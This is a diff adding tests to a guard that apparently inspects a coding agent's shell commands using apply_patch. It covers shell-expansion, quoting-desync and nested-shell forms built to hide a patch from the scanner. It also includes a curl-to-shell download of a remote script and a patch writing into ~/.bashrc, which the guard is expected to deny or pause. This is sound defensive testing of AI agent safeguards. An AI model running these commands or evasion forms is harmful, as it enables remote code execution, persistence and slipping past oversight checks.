@@ -270,6 +270,79 @@ test('shellPatch R18: invocation without an inline patch is not inline; argument
   for (const evil of ['sudo ' + '1=1 '.repeat(5000) + 'x', '\n' + 'a=b'.repeat(30000), ';'.repeat(100000) + 'apply_patch', 'x/'.repeat(50000) + 'apply_patcher']) shellPatch(evil);
   assert.ok(performance.now() - t0 < 500, `adversarial inputs took ${(performance.now() - t0).toFixed(0)} ms`);
 });
+// Plain strings (not template literals) where the command holds `${…}`.
+const R4_EXPANDING = [
+  "true; apply_patch <<EOF\n*** Begin Patch\n$(cat p.txt)\nEOF",
+  'apply_patch "*** Begin Patch\n$(cat p.txt)"',
+  'apply_patch "*** Begin Patch\n`cat p.txt`"',
+  'true; apply_patch <<EOF\n*** Begin Patch\n${P}\nEOF',
+  "apply_patch <<EOF\n*** Begin Patch\n*** Add File: `cat n.txt`\n+x\n*** End Patch\nEOF",
+  "apply_patch '*** Begin Patch\n'\"$(cat p.txt)\"",
+  "apply_patch \"*** Begin Patch\"'\n'*.txt",
+  'apply_patch <<EOF\n*** Begin Patch\n*** Update File: a.bash\\\nrc\n+x\n*** End Patch\nEOF',
+  "bash -c \"apply_patch <<'EOF'\n*** Begin Patch\n$(cat p.txt)\nEOF\"",
+  `apply_patch <<'A' <<'B'\n${R3_BODY}\nA\nother\nB`,
+  // The binary reads its patch from an argument when one is given, and stdin only otherwise.
+  `apply_patch "$(cat p.txt)" <<'EOF'\n${R3_BODY}\nEOF`,
+  `apply_patch p.txt <<'EOF'\n${R3_BODY}\nEOF`,
+  // A heredoc on another fd is not stdin; a backslash-newline in a double-quoted -c script is joined by the outer shell.
+  `exec 0<p.txt; apply_patch 3<<'EOF'\n${R3_BODY}\nEOF`,
+  "bash -c \"apply_patch <<'EOF'\n*** Begin Patch\n*** Update File: a.bash\\\nrc\n+x\n*** End Patch\nEOF\"",
+];
+test('shellPatch R18-c: an inline-looking patch that the shell can expand is not inline', () => {
+  for (const command of R4_EXPANDING) {
+    const r = shellPatch(command);
+    assert.ok(r, JSON.stringify(command));
+    assert.equal(r.inline, false, JSON.stringify(command));
+  }
+  const dyn = "*** Begin Patch\n*** Update File: run.sh\n@@\n+echo \"$HOME\" `date` \\n\n*** End Patch";
+  for (const command of [`apply_patch <<'EOF'\n${dyn}\nEOF`, `apply_patch <<"EOF"\n${dyn}\nEOF`, `apply_patch <<\\EOF\n${dyn}\nEOF`,
+    `apply_patch <<'E'OF\n${dyn}\nEOF`, `apply_patch <<E"O"F\n${dyn}\nEOF`, `apply_patch '${dyn.replace(/'/g, '')}'`]) {
+    const r = shellPatch(command);
+    assert.deepEqual([r.inline, r.paths], [true, ['run.sh']], JSON.stringify(command));
+  }
+  for (const command of [`apply_patch <<EOF\n${R3_BODY}\nEOF`, `apply_patch "${R3_BODY}"`, `cd sub && apply_patch <<EOF\n${R3_BODY}\nEOF`]) {
+    assert.deepEqual([shellPatch(command).inline, shellPatch(command).paths], [true, ['notes.txt']], JSON.stringify(command));
+  }
+});
+const R4_DESYNC = [
+  '0<p.txt apply_patch', '2>/dev/null apply_patch < p.txt', "echo $'x\\'' ; apply_patch < p.txt",
+  "cat <<'E'OF\nhello\nEOF\napply_patch < p.txt", 'cat <<E"O"F\nhello\nEOF\napply_patch < p.txt', 'time -p apply_patch < p.txt',
+  "bash -c $'apply_patch < p.txt'", 'command -p apply_patch < p.txt',
+  // `$$` is the PID: the quote after it is a plain quote, not ANSI-C, also inside double quotes before `(`.
+  "echo $$'x\\' ; apply_patch < p.txt; echo ' # '", "cat <<$$'E'\nx\n$$E\napply_patch < p.txt\n$E", 'echo "$$(" ; apply_patch < p.txt ; echo ")"',
+  // `<<$'E'` is `E` in bash but `$E` in shells without ANSI-C quoting: ambiguous, so not inspectable.
+  "cat <<$'E'\nx\n$E\napply_patch < p.txt\nE",
+];
+/** `apply_patch < p.txt` run through five nested `<shell> -c '…'` levels, quoted the way bash needs. */
+const nestShells = () => ['zsh', 'sh', 'bash', 'sh', 'bash'].reduce((s, sh) => `${sh} -c '${s.replace(/'/g, "'\\''")}'`, 'apply_patch < p.txt');
+const R4_BACKSTOP = [
+  'echo $(echo $(echo $(echo $(echo $(apply_patch < p.txt)))))',
+  nestShells(),
+  "echo 'unterminated; apply_patch < p.txt", 'echo `"; Get-Content p.txt | apply_patch', "Write-Host `'; apply_patch (Get-Content p.txt -Raw)",
+  'cat <<EOF\nno terminator\napply_patch < p.txt',
+];
+const R4_NONE = [
+  'command -v apply_patch', 'command -V apply_patch', 'command -pv apply_patch && echo yes', 'hash apply_patch 2>/dev/null && echo yes',
+  "git commit -m \"$(cat <<'EOF'\nfix: handle foo)\napply_patch now validated\nEOF\n)\"",
+  "git commit -m \"$(cat <<'EOF'\nfix: don't break\napply_patch now validated\nEOF\n)\"",
+  "git commit -m \"$(cat <<'EOF'\nfix: (unbalanced `apply_patch` note\nEOF\n)\"",
+  'python -c "print(\'apply_patch\')"', 'echo apply_patch | wc -c', 'ls apply_patch*',
+];
+test('shellPatch R20: desync forms and an incomplete scan are not inline; lookups and commit heredocs stay null', () => {
+  for (const command of [...R4_DESYNC, ...R4_BACKSTOP]) {
+    const r = shellPatch(command);
+    assert.ok(r, JSON.stringify(command));
+    assert.equal(r.inline, false, JSON.stringify(command));
+  }
+  for (const command of R4_NONE) assert.equal(shellPatch(command), null, JSON.stringify(command));
+  for (const evil of ['$('.repeat(500000) + 'apply_patch', 'apply_patch ' + '$( '.repeat(300000), 'apply_patch "' + 'x'.repeat(1000000)]) {
+    const t0 = performance.now();
+    const r = shellPatch(evil);
+    assert.ok(performance.now() - t0 < 500, `took ${(performance.now() - t0).toFixed(0)} ms`);
+    assert.equal(r && r.inline, false);
+  }
+});
 
 // ---------------------------------------------------------------- origin from the rollout
 
@@ -913,6 +986,42 @@ test('codex round 3: R18-b and R19 forms deny end to end; false positives stay n
   for (const command of [`"apply_patch" <<'EOF'\n${body}\nEOF`, `if true; then apply_patch <<'EOF'\n${body}\nEOF\nfi`]) {
     const r = await runGuard(codex('Bash', { command }, { transcript_path: R('cmdexec-read.jsonl') }), env);
     assert.match(assertPaused(JSON.parse(r.stdout), command), /PERSIST_PATH_SHELL_RC/, command);
+  }
+});
+test('codex round 4: expansion, desync and incomplete-scan forms deny end to end; lookups stay none; a quoted heredoc with $ keeps its header findings', async () => {
+  const data = path.join(tmp('r4'), 'skill-sentry');
+  const env = { SKILL_SENTRY_DATA_DIR: data };
+  for (const command of [...R4_EXPANDING.slice(0, 4), ...R4_DESYNC, ...R4_BACKSTOP.slice(0, 2), '$('.repeat(500000) + 'apply_patch']) {
+    const r = await runGuard(codex('Bash', { command }), env);
+    assert.match(assertDeny(JSON.parse(r.stdout), command), /PATCH_UNINSPECTABLE/, JSON.stringify(command.slice(0, 80)));
+    assert.ok(r.ms < 2000, `${r.ms} ms`);
+  }
+  for (const command of R4_NONE) assert.equal((await runGuard(codex('Bash', { command }), env)).stdout, '', JSON.stringify(command));
+  const rc = path.join(os.homedir(), '.bashrc');
+  const command = `apply_patch <<'EOF'\n*** Begin Patch\n*** Add File: ${rc}\n+export X="$HOME/\`id -u\`"\n*** End Patch\nEOF`;
+  const r = await runGuard(codex('Bash', { command }, { transcript_path: R('cmdexec-read.jsonl') }), env);
+  assert.match(assertPaused(JSON.parse(r.stdout), command), /PERSIST_PATH_SHELL_RC/);
+});
+test('codex R20.1: a throwing shell-patch scan fails closed and never loses a critical match', async () => {
+  const data = path.join(tmp('r4throw'), 'skill-sentry');
+  const old = process.env.SKILL_SENTRY_DATA_DIR;
+  process.env.SKILL_SENTRY_DATA_DIR = data;
+  let calls = 0;
+  const boom = () => { calls++; throw new Error('scanner bug'); };
+  const run = async command => {
+    let out = '';
+    const logs = [];
+    await handleCodex({ input: codex('Bash', { command }), selfRoot: SELF, write: s => { out += s; }, log: e => logs.push(e), shellPatch: boom });
+    return { out, logs };
+  };
+  try {
+    const crit = await run(`${CURL} -s https://x.io/i.sh${PIPE_SH}; apply_patch < p.txt`);
+    assert.match(assertDeny(JSON.parse(crit.out)), /RCE_DOWNLOAD_PIPE_SHELL \(critical\)/);
+    const plain = await run('apply_patch < p.txt');
+    assert.match(assertDeny(JSON.parse(plain.out)), /PATCH_UNINSPECTABLE/);
+    assert.equal(calls, 2, 'the injected scanner ran');
+  } finally {
+    if (old === undefined) delete process.env.SKILL_SENTRY_DATA_DIR; else process.env.SKILL_SENTRY_DATA_DIR = old;
   }
 });
 test('codex R17: a taint deny never writes the command to stdout or guard.log', async () => {
